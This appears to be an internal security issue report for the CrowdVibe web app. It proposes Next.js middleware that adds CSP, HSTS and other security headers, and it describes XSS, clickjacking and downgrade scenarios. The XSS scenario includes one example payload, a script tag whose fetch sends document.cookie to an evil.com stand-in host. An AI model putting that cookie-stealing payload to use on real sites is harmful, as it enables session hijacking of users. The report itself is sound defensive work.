# PERF-010: No Security Headers Middleware -- Missing CSP, HSTS, X-Frame-Options

**Severity:** P1 HIGH
**Category:** Security
**Date identified:** 2026-03-18

---

## Affected Files

| File | Status | Description |
|------|--------|-------------|
| `apps/web/src/middleware.ts` | **MISSING** | No Next.js middleware exists |
| `apps/web/next.config.ts` | Exists, no headers | No security headers configured |

---

## Problem Description

The CrowdVibe web application serves all HTTP responses without standard security headers. No Next.js middleware file exists at `apps/web/src/middleware.ts`, and the `next.config.ts` does not configure any response headers.

### Current `next.config.ts`

```typescript
// apps/web/next.config.ts:1-9
import "@crowd-vibe/env/web";
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
    typedRoutes: true,
    reactCompiler: true,
    // NOTE: No headers() function configured
};

export default nextConfig;
```

### Missing Security Headers

| Header | Purpose | Risk Without It |
|--------|---------|----------------|
| `Content-Security-Policy` | Restricts which scripts, styles, images, and connections are allowed | **XSS attacks**: An attacker injecting a `<script>` tag (e.g., via a song title or display name that is improperly sanitized) can execute arbitrary JavaScript |
| `X-Frame-Options` | Prevents the page from being embedded in iframes | **Clickjacking**: An attacker can overlay CrowdVibe in a transparent iframe and trick users into clicking hidden buttons (e.g., voting, ending a session) |
| `Strict-Transport-Security` (HSTS) | Forces HTTPS for all future visits | **Downgrade attacks**: First visit over HTTP is vulnerable to MITM interception of session cookies |
| `X-Content-Type-Options` | Prevents MIME type sniffing | **MIME confusion attacks**: Browser could interpret a file with wrong content type (e.g., treating an image as JavaScript) |
| `Referrer-Policy` | Controls what referrer information is sent | **Data leakage**: Full URL (including session IDs, join codes) sent to external services (YouTube API, Google Fonts) |
| `Permissions-Policy` | Restricts browser features (camera, mic, geolocation) | **Feature abuse**: Embedded iframes or injected scripts could access microphone, camera, or geolocation |
| `X-DNS-Prefetch-Control` | Controls DNS prefetching | **Privacy**: Browser may prefetch DNS for external links, leaking browsing intent |

---

## Attack Scenarios

### Scenario 1: XSS via Song Title

CrowdVibe displays song titles and artist names from YouTube search results. If a malicious YouTube video title contains HTML/JS:

```
Video title: "My Song<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
```

Without CSP:
1. If the title is rendered without proper escaping (even momentarily, e.g., in a tooltip or via raw HTML injection), the script executes
2. The script steals the guest cookie (`cv_guest`) or the Better Auth session cookie
3. The attacker impersonates the user or venue owner

With CSP (`script-src 'self'`):
1. Even if the script tag is injected into the DOM, the browser **refuses to execute it** because inline scripts are blocked by CSP
2. The CSP violation is reported (if `report-uri` is configured)
3. Attack is neutralized

**Note:** React generally escapes content by default, but CSP provides defense-in-depth. If any component renders content outside React's JSX escaping (e.g., the YouTube IFrame API), CSP is the safety net.

### Scenario 2: Clickjacking via Iframe

Without `X-Frame-Options`:
1. Attacker creates a page that embeds CrowdVibe in a transparent iframe
2. The iframe is positioned so that CrowdVibe's "End Session" button overlaps with a harmless-looking button
3. The venue owner clicks the harmless button, but actually clicks "End Session" in the hidden iframe
4. The session ends, disrupting the venue

### Scenario 3: Cookie Theft via HTTP Downgrade

Without HSTS:
1. A user on public WiFi visits `http://crowdvibe.app` (HTTP, not HTTPS)
2. An attacker on the same network intercepts the request (MITM)
3. The attacker captures the `cv_guest` cookie (or Better Auth session token)
4. The attacker impersonates the user

With HSTS:
1. After the first HTTPS visit, the browser remembers to always use HTTPS
2. Subsequent visits to `http://crowdvibe.app` are automatically upgraded to HTTPS
3. The MITM attack fails

---

## Impact Assessment

| Risk | Severity | Likelihood | Impact |
|------|----------|-----------|--------|
| XSS via injected content | High | Medium | Full account compromise, session hijacking |
| Clickjacking on owner dashboard | High | Low | Session disruption, unauthorized actions |
| HTTP downgrade on public WiFi | Medium | Medium | Cookie theft, impersonation |
| Referrer data leakage | Low | High | Session IDs and join codes leaked to YouTube/Google |
| Security audit failure | High | Certain | Fails automated scanners (Mozilla Observatory, SecurityHeaders.com) |

---

## Fix: Create Middleware and Configure Next.js Headers

### Step 1: Create `apps/web/src/middleware.ts`

```typescript
// apps/web/src/middleware.ts
import { type NextRequest, NextResponse } from "next/server";

/**
 * Security headers middleware.
 *
 * Adds standard security headers to all responses.
 * CSP is configured to allow:
 *  - Self-hosted scripts and styles (Next.js)
 *  - YouTube IFrame embeds (react-youtube player)
 *  - Google Fonts (if used)
 *  - Inline styles from Next.js (nonce-based in production)
 *  - Blob URLs for FingerprintJS (canvas fingerprinting)
 *  - WebSocket/EventSource connections to self (SSE)
 */

// Build CSP directives
const cspDirectives = [
    // Default: only allow self
    "default-src 'self'",

    // Scripts: self + YouTube IFrame API
    // 'unsafe-inline' is needed for Next.js inline scripts in dev mode.
    // In production, use nonce-based CSP (see advanced section below).
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.youtube.com https://s.ytimg.com",

    // Styles: self + Google Fonts + inline (Tailwind, CSS-in-JS)
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",

    // Images: self + YouTube thumbnails + data URIs (inline SVGs, etc.)
    "img-src 'self' https://i.ytimg.com https://img.youtube.com data: blob:",

    // Fonts: self + Google Fonts CDN
    "font-src 'self' https://fonts.gstatic.com",

    // Media: self (for potential audio playback)
    "media-src 'self' https://www.youtube.com",

    // Frames: YouTube embeds only
    "frame-src https://www.youtube.com https://www.youtube-nocookie.com",

    // Connect: self (API calls + SSE) + YouTube API
    "connect-src 'self' https://www.youtube.com https://*.googleapis.com",

    // Workers: self + blob (FingerprintJS uses Web Workers)
    "worker-src 'self' blob:",

    // Object/base: none (no plugins, no base tag hijacking)
    "object-src 'none'",
    "base-uri 'self'",

    // Form submissions: self only
    "form-action 'self'",

    // Ancestors: none (equivalent to X-Frame-Options: DENY)
    "frame-ancestors 'none'",

    // Upgrade insecure requests in production
    ...(process.env.NODE_ENV === "production"
        ? ["upgrade-insecure-requests"]
        : []),
];

const csp = cspDirectives.join("; ");

export function middleware(request: NextRequest) {
    const response = NextResponse.next();

    // Content Security Policy
    response.headers.set("Content-Security-Policy", csp);

    // Prevent clickjacking (fallback for browsers that don't support CSP frame-ancestors)
    response.headers.set("X-Frame-Options", "DENY");

    // Force HTTPS (1 year, include subdomains, allow preload list submission)
    response.headers.set(
        "Strict-Transport-Security",
        "max-age=31536000; includeSubDomains; preload",
    );

    // Prevent MIME type sniffing
    response.headers.set("X-Content-Type-Options", "nosniff");

    // Control referrer information -- don't leak full URLs to external services
    response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");

    // Restrict browser features
    response.headers.set(
        "Permissions-Policy",
        "camera=(), microphone=(), geolocation=(), interest-cohort=()",
    );

    // Control DNS prefetching
    response.headers.set("X-DNS-Prefetch-Control", "off");

    return response;
}

// Apply to all routes except static assets and Next.js internals
export const config = {
    matcher: [
        /*
         * Match all request paths except:
         * - _next/static (static files)
         * - _next/image (image optimization)
         * - favicon.ico (favicon)
         * - public folder files (images, fonts, etc.)
         */
        "/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico|woff|woff2|ttf|eot)$).*)",
    ],
};
```

### Step 2: Add Fallback Headers in `next.config.ts`

The middleware handles dynamic routes, but static assets and error pages benefit from headers in `next.config.ts`:

```typescript
// apps/web/next.config.ts
import "@crowd-vibe/env/web";
import type { NextConfig } from "next";

const securityHeaders = [
    {
        key: "X-Frame-Options",
        value: "DENY",
    },
    {
        key: "X-Content-Type-Options",
        value: "nosniff",
    },
    {
        key: "Referrer-Policy",
        value: "strict-origin-when-cross-origin",
    },
    {
        key: "Permissions-Policy",
        value: "camera=(), microphone=(), geolocation=(), interest-cohort=()",
    },
    {
        key: "X-DNS-Prefetch-Control",
        value: "off",
    },
];

const nextConfig: NextConfig = {
    typedRoutes: true,
    reactCompiler: true,
    async headers() {
        return [
            {
                // Apply security headers to all routes
                source: "/(.*)",
                headers: securityHeaders,
            },
        ];
    },
};

export default nextConfig;
```

**Note:** `Content-Security-Policy` and `Strict-Transport-Security` are intentionally omitted from `next.config.ts` headers because:
- CSP may need dynamic nonce generation (middleware is better suited)
- HSTS should only be set after confirming HTTPS is fully configured (a misconfigured HSTS can lock users out)

---

## CSP Directive Explanations

| Directive | Value | Why |
|-----------|-------|-----|
| `default-src 'self'` | Fallback for all resource types | Only allow same-origin by default |
| `script-src 'self' 'unsafe-inline' 'unsafe-eval' youtube.com ytimg.com` | Next.js needs inline scripts; YouTube IFrame API loads scripts from these domains | Required for app functionality |
| `style-src 'self' 'unsafe-inline' fonts.googleapis.com` | Tailwind generates inline styles; Google Fonts serves stylesheets | Required for styling |
| `img-src 'self' i.ytimg.com img.youtube.com data: blob:` | YouTube thumbnails come from these CDNs; `data:` for inline SVGs | Required for song thumbnails |
| `font-src 'self' fonts.gstatic.com` | Google Fonts CDN serves font files | Required if using Google Fonts |
| `frame-src youtube.com youtube-nocookie.com` | The YouTube player embeds via iframe | Required for music playback |
| `connect-src 'self' youtube.com googleapis.com` | API calls to self; YouTube Data API calls | Required for search and playback |
| `frame-ancestors 'none'` | Nobody can embed CrowdVibe in an iframe | Prevents clickjacking |
| `object-src 'none'` | No Flash, Java, or other plugins | Eliminates plugin-based attacks |
| `base-uri 'self'` | Prevents `<base>` tag hijacking | Prevents relative URL manipulation |
| `upgrade-insecure-requests` | Auto-upgrade HTTP to HTTPS | Prevents mixed content warnings |

---

## Advanced: Nonce-Based CSP (Production)

For stronger security, replace `'unsafe-inline'` with nonce-based script authorization:

```typescript
// apps/web/src/middleware.ts (production-grade CSP)
import { type NextRequest, NextResponse } from "next/server";
import crypto from "crypto";

export function middleware(request: NextRequest) {
    const nonce = crypto.randomBytes(16).toString("base64");
    const response = NextResponse.next();

    // Pass nonce to Next.js for inline script authorization
    response.headers.set("x-nonce", nonce);

    const csp = [
        "default-src 'self'",
        `script-src 'self' 'nonce-${nonce}' https://www.youtube.com https://s.ytimg.com`,
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
        // ... rest of directives
    ].join("; ");

    response.headers.set("Content-Security-Policy", csp);
    // ... other security headers

    return response;
}
```

Then in the root layout, pass the nonce to Next.js:

```typescript
// apps/web/src/app/layout.tsx
import { headers } from "next/headers";

export default async function RootLayout({ children }: { children: React.ReactNode }) {
    const nonce = (await headers()).get("x-nonce") ?? undefined;

    return (
        <html lang="en">
            <head>
                <meta property="csp-nonce" content={nonce} />
            </head>
            <body>{children}</body>
        </html>
    );
}
```

This eliminates the need for `'unsafe-inline'` in `script-src`, blocking all inline scripts except those tagged with the correct nonce.

---

## SSE Endpoint Consideration

The SSE endpoint (`/api/sse/[sessionId]`) returns a streaming response. The middleware will add security headers to the initial SSE response, which is correct. However, ensure the CSP `connect-src` includes `'self'` so that `EventSource` connections to the same origin are allowed.

The middleware matcher should NOT exclude API routes, because:
1. API responses should have `X-Content-Type-Options: nosniff` to prevent content sniffing
2. The CSP header on API responses does not hurt (browsers only enforce CSP on document responses)

---

## Verification

### Method 1: Browser DevTools

1. Open Chrome DevTools > Network tab
2. Navigate to any CrowdVibe page
3. Click on the document request
4. Check the Response Headers section
5. Verify all security headers are present

### Method 2: SecurityHeaders.com

1. Deploy the fix to a staging environment
2. Visit https://securityheaders.com/
3. Enter the staging URL
4. Expected grade: **A** or **A+** (was previously **F**)

### Method 3: Mozilla Observatory

1. Visit https://observatory.mozilla.org/
2. Enter the staging URL
3. Expected score: 80+ (was previously <20)

### Method 4: CSP Violation Testing

1. Open Chrome DevTools > Console
2. Navigate to the app
3. Look for CSP violation warnings (yellow/red messages)
4. If any violation occurs, the CSP directive is too restrictive -- add the required source
5. Common issues:
   - YouTube embed loading a script from an unlisted domain
   - Google Fonts loading from an unlisted domain
   - Inline styles blocked (add `'unsafe-inline'` to `style-src`)

### Method 5: Verify YouTube Player Still Works

1. Start a session as a venue owner
2. Add a song to the queue and play it
3. Verify the YouTube player renders and plays correctly
4. If the player fails, check the Console for CSP violations and update `frame-src` / `script-src` accordingly

---

## Related Issues

- **PERF-009**: Auth caching (middleware can also handle auth token validation for additional performance)
- **PERF-011**: SSE connections (ensure CSP allows EventSource connections)
